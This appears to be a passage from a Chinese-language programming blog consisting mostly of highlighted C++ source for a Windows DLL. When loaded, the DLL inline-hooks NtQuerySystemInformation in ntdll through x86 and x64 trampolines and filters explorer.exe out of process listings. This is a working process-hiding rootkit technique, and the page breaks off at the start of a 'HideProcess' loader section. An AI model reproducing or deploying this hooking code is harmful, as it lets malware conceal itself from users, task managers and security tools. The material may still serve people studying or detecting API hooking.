class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _WIN32 || _WIN64</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _WIN64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ENVIRONMENT_64</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ENVIRONMENT_32</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;<br>    SystemBasicInformation,<br>    SystemProcessorInformation,<br>    SystemPerformanceInformation,<br>    SystemTimeOfDayInformation,<br>    SystemPathInformation,<br>    SystemProcessInformation,<br>    SystemCallCountInformation,<br>    SystemDeviceInformation,<br>    SystemProcessorPerformanceInformation,<br>    SystemFlagsInformation,<br>    SystemCallTimeInformation,<br>    SystemModuleInformation,<br>    SystemLocksInformation,<br>    SystemStackTraceInformation,<br>    SystemPagedPoolInformation,<br>    SystemNonPagedPoolInformation,<br>    SystemHandleInformation,<br>    SystemObjectInformation,<br>    SystemPageFileInformation,<br>    SystemVdmInstemulInformation,<br>    SystemVdmBopInformation,<br>    SystemFileCacheInformation,<br>    SystemPoolTagInformation,<br>    SystemInterruptInformation,<br>    SystemDpcBehaviorInformation,<br>    SystemFullMemoryInformation,<br>    SystemLoadGdiDriverInformation,<br>    SystemUnloadGdiDriverInformation,<br>    SystemTimeAdjustmentInformation,<br>    SystemSummaryMemoryInformation,<br>    SystemNextEventIdInformation,<br>    SystemEventIdsInformation,<br>    SystemCrashDumpInformation,<br>    SystemExceptionInformation,<br>    SystemCrashDumpStateInformation,<br>    SystemKernelDebuggerInformation,<br>    SystemContextSwitchInformation,<br>    SystemRegistryQuotaInformation,<br>    SystemExtendServiceTableInformation,<br>    SystemPrioritySeperation,<br>    SystemPlugPlayBusInformation,<br>    SystemDockInformation,<br>    SystemProcessorSpeedInformation,<br>    SystemCurrentTimeZoneInformation,<br>    SystemLookasideInformation<br>&#125; SYSTEM_INFORMATION_CLASS;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NT_SUCCESS(StatCode)  ((NTSTATUS)(StatCode) &gt;= 0)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">UNICODE_STRING</span> &#123;<br>    USHORT Length;<br>    USHORT MaximumLength;<br>    PWSTR  Buffer;<br>&#125; UNICODE_STRING, * PUNICODE_STRING;<br><br><span class="hljs-keyword">typedef</span> LONG KPRIORITY;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_SYSTEM_PROCESS_INFORMATION</span><br>&#123;<br>    ULONG NextEntryOffset;<br>    ULONG NumberOfThreads;<br>    LARGE_INTEGER WorkingSetPrivateSize; <span class="hljs-comment">//VISTA</span><br>    ULONG HardFaultCount; <span class="hljs-comment">//WIN7</span><br>    ULONG NumberOfThreadsHighWatermark; <span class="hljs-comment">//WIN7</span><br>    ULONGLONG CycleTime; <span class="hljs-comment">//WIN7</span><br>    LARGE_INTEGER CreateTime;<br>    LARGE_INTEGER UserTime;<br>    LARGE_INTEGER KernelTime;<br>    UNICODE_STRING ImageName;<br>    KPRIORITY BasePriority;<br>    HANDLE UniqueProcessId;<br>    HANDLE InheritedFromUniqueProcessId;<br>    ULONG HandleCount;<br>    ULONG SessionId;<br>    ULONG_PTR PageDirectoryBase;<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This part corresponds to VM_COUNTERS_EX.</span><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> *NOT* THE SAME AS VM_COUNTERS!</span><br><span class="hljs-comment">//</span><br>SIZE_T PeakVirtualSize;<br>SIZE_T VirtualSize;<br>ULONG PageFaultCount;<br>SIZE_T PeakWorkingSetSize;<br>SIZE_T WorkingSetSize;<br>SIZE_T QuotaPeakPagedPoolUsage;<br>SIZE_T QuotaPagedPoolUsage;<br>SIZE_T QuotaPeakNonPagedPoolUsage;<br>SIZE_T QuotaNonPagedPoolUsage;<br>SIZE_T PagefileUsage;<br>SIZE_T PeakPagefileUsage;<br>SIZE_T PrivatePageCount;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This part corresponds to IO_COUNTERS</span><br><span class="hljs-comment">//</span><br>LARGE_INTEGER ReadOperationCount;<br>LARGE_INTEGER WriteOperationCount;<br>LARGE_INTEGER OtherOperationCount;<br>LARGE_INTEGER ReadTransferCount;<br>LARGE_INTEGER WriteTransferCount;<br>LARGE_INTEGER OtherTransferCount;<br><span class="hljs-comment">//    SYSTEM_THREAD_INFORMATION TH[1];</span><br>&#125; SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;<br><br><br><span class="hljs-comment">//定义的函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(_stdcall *LPFN_NTQUERYSYSTEMINFORMATIONORIGINALDEF)</span><span class="hljs-params">(SYSTEM_INFORMATION_CLASS </span></span><br><span class="hljs-params"><span class="hljs-function">    SystemInformationClass, PVOID SystemInformation, SIZE_T SystemInformationLength, PSIZE_T ReturnLength)</span></span>;<br><br><br><span class="hljs-function">NTSTATUS _stdcall <span class="hljs-title">FakeNtQuerySystemInformation</span><span class="hljs-params">(SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID SystemInformation, SIZE_T SystemInformationLength, PSIZE_T ReturnLength)</span></span>;<br><br><span class="hljs-function">PVOID <span class="hljs-title">Allocate2GBRange</span><span class="hljs-params">(UINT_PTR VirtualAddress, SIZE_T ViewSize)</span></span>;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(ENVIRONMENT_32)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InstallInlineHook_x86</span><span class="hljs-params">()</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(ENVIRONMENT_64)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InstallInlineHook_x64</span><span class="hljs-params">()</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>2)DllMain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DllMain.h&quot;</span></span><br><br>LPFN_NTQUERYSYSTEMINFORMATIONORIGINALDEF __WhiteListAddrss; <span class="hljs-comment">//白名单地址</span><br><br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br><br>HMODULE ModuleHandle = <span class="hljs-built_in">GetModuleHandle</span>(_T(<span class="hljs-string">&quot;ntdll.dll&quot;</span>));<br>LPVOID OriginalAddress = <span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br>TCHAR BufferData[<span class="hljs-number">0x1000</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>_stprintf(BufferData, _T(<span class="hljs-string">&quot;0x%p&quot;</span>), OriginalAddress);<br><br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, BufferData, _T(<span class="hljs-string">&quot;DLL_PROCESS_ATTACH&quot;</span>), <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(ENVIRONMENT_32)</span><br><span class="hljs-built_in">InstallInlineHook_x86</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(ENVIRONMENT_64)</span><br><span class="hljs-built_in">InstallInlineHook_x64</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>&#123;<br><br><span class="hljs-comment">//指令恢复</span><br><br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InstallInlineHook_x86</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BYTE v1[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;   <span class="hljs-comment">//ShellCode  </span><br>BYTE v2[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xE9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;     <span class="hljs-comment">//覆盖源函数的前5个字节指令</span><br>    HMODULE ModuleHandle = <span class="hljs-built_in">GetModuleHandle</span>(_T(<span class="hljs-string">&quot;ntdll.dll&quot;</span>));<br>LPVOID OriginalAddress = <span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br><br>LPVOID TrampolineAddress = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><br><span class="hljs-built_in">memcpy</span>(v1, OriginalAddress, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">// Offset = OriginalAddress + 5 - TrampolineAddress + 5 - 5</span><br><br>*(DWORD*)(v1 + <span class="hljs-number">6</span>) = (DWORD)OriginalAddress - (DWORD)TrampolineAddress - <span class="hljs-number">5</span>;  <span class="hljs-comment">//仔细审题</span><br><br><span class="hljs-built_in">memcpy</span>(TrampolineAddress, v1, <span class="hljs-number">10</span>);<br><br>__WhiteListAddrss = (LPFN_NTQUERYSYSTEMINFORMATIONORIGINALDEF)TrampolineAddress;<br><br>*(DWORD*)&amp;v2[<span class="hljs-number">1</span>] = (DWORD)FakeNtQuerySystemInformation - (DWORD)OriginalAddress - <span class="hljs-number">5</span>;<br><br><span class="hljs-comment">//将v2中的字节指令覆盖到源函数前5个字节处</span><br>BOOL IsOk = <span class="hljs-built_in">WriteProcessMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), OriginalAddress, v2, <span class="hljs-built_in">sizeof</span>(v2), <span class="hljs-literal">NULL</span>);<br>    &#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InstallInlineHook_x64</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//e9 Offset(4Bytes)</span><br><span class="hljs-comment">//FF 25 0 0 0 0 绝对地址</span><br>BYTE v1[<span class="hljs-number">14</span>] = &#123; <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;    <span class="hljs-comment">//2 + 4 + 8   跳转至Fake函数</span><br>BYTE v2[<span class="hljs-number">13</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;          <span class="hljs-comment">//中间有3个零注意 是由于该函数内部存在 特定问题特殊分析</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">0:023&gt; u ZwQuerySystemInformation</span><br><span class="hljs-comment">ntdll!ZwQuerySystemInformation:</span><br><span class="hljs-comment">00007ffb`b29cd770 4c8bd1          mov     r10,rcx</span><br><span class="hljs-comment">00007ffb`b29cd773 b836000000      mov     eax,36h    //中间有3个零注意</span><br><span class="hljs-comment">*/</span><br>    BYTE v3[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xE9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;<br><br>HMODULE ModuleHandle = <span class="hljs-built_in">GetModuleHandle</span>(_T(<span class="hljs-string">&quot;ntdll.dll&quot;</span>));<br>LPVOID OriginalAddress = <span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br><br>LPVOID TrampolineAddress = <span class="hljs-built_in">Allocate2GBRange</span>((ULONG_PTR)OriginalAddress, <span class="hljs-number">27</span>); <span class="hljs-comment">//跳板地址</span><br><br>*(__int64*)&amp;v1[<span class="hljs-number">6</span>] = (__int64)FakeNtQuerySystemInformation;  <br><span class="hljs-built_in">memcpy</span>(TrampolineAddress, v1, <span class="hljs-number">14</span>);<br>    <span class="hljs-built_in">memcpy</span>(v2, OriginalAddress, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//TrampolineAddress + 15 + 5 + 5  + Offset  = OriginalAddress + 5</span><br><br>*(DWORD*)(v2 + <span class="hljs-number">9</span>) = (DWORD)OriginalAddress - <span class="hljs-number">15</span> - (DWORD)TrampolineAddress - <span class="hljs-number">5</span>;<br><span class="hljs-built_in">memcpy</span>((LPVOID)((__int64)TrampolineAddress + <span class="hljs-number">15</span>), v2, <span class="hljs-number">13</span>);<br><br>__WhiteListAddrss = (LPFN_NTQUERYSYSTEMINFORMATIONORIGINALDEF)((__int64)TrampolineAddress + (__int64)<span class="hljs-number">15</span>);<br><br>*(DWORD*)&amp;v3[<span class="hljs-number">1</span>] = (DWORD)TrampolineAddress - (DWORD)OriginalAddress - <span class="hljs-number">5</span>;<br>    BOOL IsOk = <span class="hljs-built_in">WriteProcessMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), OriginalAddress, v3, <span class="hljs-built_in">sizeof</span>(v3), <span class="hljs-literal">NULL</span>);<br>    &#125;<br><span class="hljs-function">PVOID <span class="hljs-title">Allocate2GBRange</span><span class="hljs-params">(UINT_PTR VirtualAddress, SIZE_T ViewSize)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">static</span> ULONG AllocationGranularity;<br>    <span class="hljs-keyword">if</span> (!AllocationGranularity)<br>&#123;<br>SYSTEM_INFO SystemInfo;<br><span class="hljs-built_in">GetSystemInfo</span>(&amp;SystemInfo);<br>AllocationGranularity = SystemInfo.dwAllocationGranularity;<br>&#125;<br><br>UINT_PTR Min, Max, v1, v2 = AllocationGranularity - <span class="hljs-number">1</span>, Mask = ~v2;<br><br>Min = VirtualAddress &gt;= <span class="hljs-number">0x80000000</span> ? (VirtualAddress - <span class="hljs-number">0x80000000</span> + v2) &amp; Mask : <span class="hljs-number">0</span>;<br>Max = VirtualAddress &lt; (UINTPTR_MAX - <span class="hljs-number">0x80000000</span>) ? (VirtualAddress + <span class="hljs-number">0x80000000</span>) &amp; Mask : UINTPTR_MAX;<br><br>MEMORY_BASIC_INFORMATION MemoryBasicInfo;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">VirtualQuery</span>((<span class="hljs-type">void</span>*)Min, &amp;MemoryBasicInfo, <span class="hljs-built_in">sizeof</span>(MemoryBasicInfo))) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>Min = (UINT_PTR)MemoryBasicInfo.BaseAddress + MemoryBasicInfo.RegionSize;<br><br><span class="hljs-keyword">if</span> (MemoryBasicInfo.State == MEM_FREE)<br>&#123;<br>v1 = ((UINT_PTR)MemoryBasicInfo.BaseAddress + v2) &amp; Mask;<br><br><span class="hljs-keyword">if</span> (v1 &lt; Min &amp;&amp; ViewSize &lt;= (Min - v1))<br>&#123;<br><span class="hljs-keyword">if</span> (v1 = (UINT_PTR)<span class="hljs-built_in">VirtualAlloc</span>((PVOID)v1, ViewSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))<br><span class="hljs-keyword">return</span> (PVOID)v1;<br>&#125;<br>&#125;<br>    &#125; <span class="hljs-keyword">while</span> (Min &lt; Max);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><br><span class="hljs-function">NTSTATUS _stdcall <span class="hljs-title">FakeNtQuerySystemInformation</span><span class="hljs-params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, SIZE_T SystemInformationLength, PSIZE_T ReturnLength)</span></span><br><span class="hljs-function"></span>&#123;<br>NTSTATUS Status;<br>PSYSTEM_PROCESS_INFORMATION v1 = <span class="hljs-literal">NULL</span>; <br>PSYSTEM_PROCESS_INFORMATION v2 = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//先调用源函数获取枚举信息</span><br>Status = __WhiteListAddrss(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">NT_SUCCESS</span>(Status) &amp;&amp; SystemInformationClass == SystemProcessInformation)  <span class="hljs-comment">//判读是否是由于枚举进程信息了</span><br>&#123;<br>    <br>v1 = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;   <span class="hljs-comment">//枚举到的信息在该成员中</span><br>v2 = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)v1 + v1-&gt;NextEntryOffset);<br><br><span class="hljs-keyword">while</span> (v2-&gt;NextEntryOffset != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">lstrcmpW</span>((&amp;v2-&gt;ImageName)-&gt;Buffer, <span class="hljs-string">L&quot;explorer.exe&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>v1-&gt;NextEntryOffset += v2-&gt;NextEntryOffset;<br>&#125;<br>v1 = v2;<br>v2 = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)v1 + v1-&gt;NextEntryOffset);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//放行数据</span><br><span class="hljs-keyword">return</span> Status;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>2.HideProcess<br>1)_tmain.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span 